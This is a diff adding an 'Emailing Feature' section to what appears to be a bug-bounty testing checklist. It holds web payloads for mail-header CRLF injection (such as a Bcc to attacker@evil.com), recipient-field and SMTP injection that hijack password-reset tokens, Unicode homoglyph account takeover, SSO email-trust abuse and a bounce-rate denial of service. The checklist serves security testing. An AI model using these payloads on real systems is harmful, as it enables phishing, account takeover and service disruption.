@@ -2002,10 +2002,6 @@ Hackerone reports exploiting this bug
 
 </details>
 
-
-
-
-
 ### Change Password
 
 <details>
@@ -3089,5 +3085,115 @@ Generate an API key, then completely remove that user account from the workspace
 <summary>Revocation propagation delay</summary>
 
 Delete an API key in the UI and immediately use it in an automated script. Check if there is a dangerous propagation delay or caching window where the deleted key remains active for minutes or hours.
+
+</details>
+
+### Emailing Feature
+
+<details>
+
+<summary>Find &#x26; Classify the Sink</summary>
+
+* [ ] Forms that send mail: contact/feedback, "invite a friend", "share", report-abuse
+* [ ] Identity flows: signup, email verification, password reset, email-change, magic-link, OTP
+* [ ] Note what you control: just the body? the recipient? a "name" rendered into headers? the From?
+* [ ] Identify the backend (`PHP mail()` → header-injection prone; SMTP library; cloud sender like SES/SendGrid)
+* [ ] `php --rf mail` signature: `mail($to,$subject,$message,$additional_headers,$additional_parameters)` — `$additional_headers` is the injection-rich one
+
+</details>
+
+<details>
+
+<summary>Mail-Header Injection (CRLF into headers)</summary>
+
+> If user input reaches the header area of `mail()`, inject `\r\n` (or `%0d%0a`) to add headers.
+
+* [ ] **Add Cc/Bcc** to receive a copy: `\r\nCc: attacker@evil.com` / `\r\nBcc: attacker@evil.com`
+* [ ] Combined: `From:sender@d.com\r\nCc:recipient@d.co,\r\nBcc:recipient1@d.com`
+* [ ] **Spoof Subject:** `\r\nSubject: Fake Subject` (appends or replaces the original — service-dependent)
+* [ ] **Overwrite the body:** inject **two** line-feeds then your text → `From:sender@d.com\r\n\r\nMy New Fake Message.`
+* [ ] **Spoof From / Reply-To:** `\r\nFrom: ceo@company.com` , `\r\nReply-To: attacker@evil.com`
+* [ ] Try raw CRLF, `%0d%0a`, `%0a`, and Unicode/encoded newlines if filtered
+* [ ] Impact: phishing from a trusted domain, spam relay, leaking the templated message to yourself
+
+</details>
+
+<details>
+
+<summary>Recipient-Field Injection (multiple recipients / second address)</summary>
+
+> The email field itself is concatenated into the recipient list or another field.
+
+* [ ] **Parameter pollution:** `email=victim@mail.com&email=hacker@mail.com`
+* [ ] **Array of emails:** `{"email":["victim@mail.com","hacker@mail.com"]}`
+* [ ] **Separators** (get the reset/verification mail sent to you too): `victim@x.com,hacker@y.com` · `victim@x.com hacker@y.com` · `victim@x.com|hacker@y.com` · `victim@x.com;hacker@y.com`
+* [ ] **Inline Cc/Bcc in the value:** `email=victim@x.com%0acc:hacker@y.com` / `bcc:hacker@y.com`
+* [ ] Goal on reset/verify flows: receive the **victim's** token/link at your address
+
+</details>
+
+<details>
+
+<summary>Email-Address Parsing Tricks (validator vs mail-server gap)</summary>
+
+> Craft an address the app accepts/normalizes one way but the mail server delivers another — to bypass uniqueness, dodge domain allowlists, or reach the victim's mailbox.
+
+* [ ] **Subaddressing `+` tag** (ignored by most providers → same mailbox): `john.doe+intigriti@example.com` → `john.doe@example.com` (bypass "email already used", duplicate invites/trials)
+* [ ] **`-` and `{}` tagging** (rare providers ignore): `john.doe-x@example.com`
+* [ ] **Comments in parentheses** (RFC 5322, stripped): `john.doe(intigriti)@example.com` → `john.doe@example.com`
+* [ ] **Gmail dot-insensitivity:** `v.ic.t.im@gmail.com` → `victim@gmail.com`
+* [ ] **Case-insensitive local-part** on some providers
+* [ ] **IP-literal domain in brackets:** `user@[127.0.0.1]` / `user@[IPv6:...]`
+* [ ] **Quoted local-part** to smuggle structure: `"victim@evil.com"@example.com`
+* [ ] Use these to: bypass uniqueness checks, block a victim's signup (temporary DoS), or set up pre-account-takeover
+
+
+
+</details>
+
+<details>
+
+<summary>Verification-Mail Routing via SMTP Injection (advanced)</summary>
+
+> Smuggle a second address into the `RCPT TO` so the verification email lands in _your_ inbox while the app thinks it emailed the victim/domain.
+
+* [ ] Target the end state: `RCPT TO:<"collab@psres.net>collab"@example.com>` → mail routed to `collab@psres.net`
+* [ ] **Encoding overflows that decode to `@`/CRLF** when the app and SMTP layer disagree:
+  * PHP `chr()` 256-overflow (`chr` keeps adding 256 then `%6`) to produce control chars
+  * Unicode → ASCII fold: `String.fromCodePoint(0x10000 + 0x40)` → `𐁀` may normalize to `@`
+* [ ] Inject CRLF/extra-recipient inside the local-part where the validator passes but the SMTP dialog splits it
+* [ ] Confirm via Collaborator (you receive the verification/reset mail for an address you don't own)
+* [ ] This is the high-impact one: leads to verifying/owning an arbitrary address → ATO
+
+</details>
+
+<details>
+
+<summary>Unicode-Normalization ATO (email as identifier)</summary>
+
+> The app matches a victim row via a permissive comparison but binds the token to _your_ raw address. (Cross-links to the IDN/Unicode-normalization checklist.)
+
+* [ ] Register/change email to a homoglyph of the victim: `vićtim@gmail.com`, `victim@gmail.com` with soft-hyphen `\u00AD`
+* [ ] Attack the **domain** part if local is blocked: `victim@ćompany.com`, register that punycode domain, rely on the IdP emitting the ASCII version while the app normalizes
+* [ ] Compare interpretations across **DB collation vs SMTP server vs OAuth/OIDC provider** — find where one canonicalizes and another doesn't
+* [ ] Trigger reset/magic-link: token bound to attacker's Unicode address but matches victim's canonical row → ATO
+
+
+
+</details>
+
+<details>
+
+<summary>Third-Party / SSO Email Trust Abuse</summary>
+
+* [ ] **Arbitrary-domain verified account:** create + verify an account on GitHub/GitLab/Cloudflare-Zero-Trust with a domain you control → access victim-company resources gated on "@thatdomain" membership
+* [ ] **XSS in email address:** providers like GitHub/Salesforce let you create an address containing an XSS payload; if a downstream service renders the email unsanitized → stored XSS
+* [ ] **Unverified-SSO trust:** if an IdP (e.g. Salesforce) issues `email_verified=false` but the RP trusts it, register the victim's email at the IdP and SSO into the victim account (stand up a test OIDC provider issuing the victim's email with `email_verified=false` to check)
+* [ ] **Auto-reply leak:** send `From: company.com`, `Reply-To: attacker.com` → an internal auto-reply may go to the attacker
+* [ ] **Hard-bounce-rate abuse** (e.g. AWS SES 10% threshold) — flood invalid recipients to get the victim's sender suspended (DoS)
+
+
+
+
 
 </details>
